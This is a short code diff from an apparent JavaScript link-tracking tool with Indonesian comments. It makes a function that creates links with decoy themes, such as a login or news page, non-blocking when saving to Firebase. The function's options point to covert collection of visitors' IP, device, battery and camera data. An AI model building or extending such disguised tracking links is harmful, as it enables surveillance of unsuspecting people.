@@ -106,7 +106,7 @@ const THEME_PATHS = {
   login:    'masuk',
 };
 
-export async function createLink({ name, decoyTheme, trackIp, trackDevice, trackBattery, trackCamera }) {
+export function createLink({ name, decoyTheme, trackIp, trackDevice, trackBattery, trackCamera }) {
   const links    = getLinks();
   const settings = getSettings();
   const id       = generateId();
@@ -123,10 +123,10 @@ export async function createLink({ name, decoyTheme, trackIp, trackDevice, track
     },
   };
 
-  // Simpan config ke Firebase agar URL pendek cukup pakai id
+  // Simpan config ke Firebase agar URL pendek cukup pakai id (fire-and-forget)
   const fbUrl = settings.firebaseUrl;
   if (fbUrl) {
-    await saveConfigToFirebase(fbUrl, config);
+    saveConfigToFirebase(fbUrl, config);
   }
 
   const themePath = THEME_PATHS[theme] || 'berita';
